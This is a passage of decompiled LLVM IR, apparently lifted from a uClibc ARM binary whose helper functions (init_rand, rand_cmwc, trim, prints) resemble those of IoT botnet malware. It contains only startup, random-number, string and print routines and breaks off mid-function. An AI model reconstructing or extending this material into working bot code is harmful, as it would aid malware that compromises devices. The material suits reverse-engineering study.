@global_var_116dc.407 = constant i32 -456978431
@global_var_193ac.413 = constant [8 x i8] c"Success\00"
@global_var_1939c.415 = constant [15 x i8] c"Unknown error \00"
@global_var_1a03a.417 = constant i32 65536
@global_var_22824.418 = global i32* @global_var_1a03a.417
@global_var_28890.421 = global i32 0
@global_var_28894.424 = global i32 0
@global_var_28a70.426 = global i32 0
@global_var_288a4.428 = global i32 0
@global_var_2282c.430 = global i32 0
@global_var_28ba8.435 = global i32 0
@global_var_28b9c.438 = global i32 0
@global_var_28af4.440 = global i32 0
@global_var_28a84.442 = global i32 0
@global_var_2272c.445 = global i32 256
@global_var_22630.446 = global i32* @global_var_2272c.445
@global_var_28b74.450 = global i32 0
@global_var_13bdc.451 = constant i32 -382910416
@global_var_12768.458 = constant i32 -442564520
@global_var_22738.464 = global i32 0
@global_var_f9d8.466 = constant i32 -481230848
@global_var_28a9c.468 = global i32 0
@global_var_f5c4.470 = constant i32 -509587456
@global_var_22750.472 = global i32 0
@global_var_22768 = external global i32
@global_var_22788.478 = global i32 -1726662223
@global_var_22770.485 = local_unnamed_addr global i32* @global_var_22788.478
@global_var_2276c.487 = global i32* @global_var_22788.478
@global_var_19f08.501 = constant i32 0
@global_var_22804.510 = global i32 0
@global_var_28aa0.514 = local_unnamed_addr global i32 0
@global_var_28aa8.519 = global i32 0
@global_var_22338.523 = global i32 -1
@global_var_28ab0.526 = global i32 0
@global_var_28ab4.528 = local_unnamed_addr global i32 0
@global_var_136a0.529 = constant i32 -390234096
@global_var_19f30.531 = constant [10 x i8] c"/dev/null\00"
@global_var_28ab8.533 = global i32 0
@global_var_1004c.537 = constant i32 -382909968
@global_var_28aa4.539 = local_unnamed_addr global i32 0
@global_var_11650.542 = constant i32 -369095438
@global_var_2281c = external local_unnamed_addr global i32
@global_var_fad8.553 = constant i32 -442564608
@global_var_13968.555 = constant i32 -335544720
@global_var_13aa0.558 = constant i32 -275775369
@global_var_28ae0.560 = global i32 0
@global_var_28ac0.562 = global i32 0
@global_var_1a23c.564 = constant [4 x i8] c"inf\00"
@global_var_1a23f.568 = constant i32 1179535616
@global_var_1a24c.570 = constant i32 2883630
@global_var_112d8.572 = constant i32 -382908944
@global_var_28ac4.580 = global i32 0
@global_var_28adc.585 = local_unnamed_addr global i32 0
@global_var_f618.590 = constant i32 -382910448
@global_var_28bac.593 = global i32 0
@global_var_1a298.595 = constant i32 46
@global_var_28b8c.597 = global i32 0
@global_var_158a4.599 = constant i32 -369098656
@global_var_1a29c.606 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1a2b0.608 = constant i32 114
@global_var_1a2b4.610 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1a2cc.613 = constant [11 x i8] c"nameserver\00"
@global_var_1a2d8.616 = constant [7 x i8] c"domain\00"
@global_var_1a2e0.618 = constant [7 x i8] c"search\00"
@global_var_28bb0.623 = global i32 0
@global_var_28bb4.625 = global i32 0
@global_var_1a2fc.634 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1a2e8.636 = constant i32 0
@global_var_1a310.639 = constant [3 x i8] c"%x\00"
@global_var_1a314.642 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1a320.644 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_2233c.648 = global i32 0
@global_var_22848.5 = external global i8*
@global_var_2287f.71 = external global i8*
@global_var_22880.72 = local_unnamed_addr global i8 0
@global_var_22881.73 = local_unnamed_addr global i8 0
@global_var_22882.74 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_22540.298 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_22590.299 = local_unnamed_addr global i8 16
@global_var_136b4.305 = constant i8 0
@global_var_22541.334 = local_unnamed_addr global i8 1
@global_var_22591.335 = local_unnamed_addr global i8 1
@global_var_192dc.337 = constant i64* null
@global_var_100cc.517 = constant i16 16432
@3 = internal constant [2 x i8] c"\01\00"
@global_var_22828.587 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_22829.588 = local_unnamed_addr global i8 0
@global_var_18c08.264 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_22848.5 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_22848.5 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_22354.8 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_22354.8 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_22354.8 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_22354.8 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_22848.5 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_22354.8, { 1, 0 }
  uselistorder i8** @global_var_22848.5, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_22348.18, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_22348.18 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_22348.18 to i32)

; uselistorder directives
  uselistorder i32* @global_var_22348.18, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e54c.22 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 95332, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_22884.25, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_22888.26, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_2288c.27, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_22884.25 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_22884.25 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_22884.25 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_224e0.30, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_224e0.30, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_22884.25 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_224dc.33, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_224dc.33, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_22884.25 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_22884.25, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22884.25 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c10 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c10, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.011, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.011 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.011
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.011, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge1
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge1 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp43 = icmp slt i32 %arg3, 1
  br i1 %tmp43, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e020 = load i8, i8* %arg2, align 1
  %v2_85e422 = icmp eq i8 %v2_85e020, 0
  br i1 %v2_85e422, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc24 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.023 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.023, 1
  %v1_85d4 = add i32 %v4_85dc24, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge4 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_8618 ], [ %storemerge4, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867017 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867017, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.118 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.118, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.118, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e828 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a810 = load i8, i8* %arg2, align 1
  %v2_86ac12 = icmp eq i8 %v2_86a810, 0
  br i1 %v2_86ac12, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a414 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.013 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.013, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a414, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e827 = phi i32 [ %v3_86e828, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e47 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e47, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.38 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.38, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.38, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e827, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
